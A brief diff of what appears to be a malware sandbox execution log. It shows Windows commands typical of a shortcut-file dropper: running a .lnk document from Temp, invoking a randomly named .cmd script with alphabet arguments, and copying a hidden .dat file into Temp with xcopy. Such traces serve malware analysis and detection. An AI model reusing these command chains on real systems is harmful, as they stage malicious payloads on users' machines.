@@ -14,7 +14,7 @@ Exec >>
 
 cmd /c C:\Users\Admin\AppData\Local\Temp\REF_Document.lnk
 
-cmd.exe /c letetasody\sacsimsapI.cmd A B C D E F G H I J U L M N O P Q R S T U V W X Y Z 0 1 2 3 4 5 6 7 8 9
+cmd.exe /c jawjogfenO\eathipayem.cmd A B C D E F G H I J C L M N O P Q R S T U V W X Y Z 0 1 2 3 4 5 6 7 8 9
 
 xcopy /s /i /e /h letetasody\pamphleteering.dat C:\Users\Admin\AppData\Local\Temp\*  
 
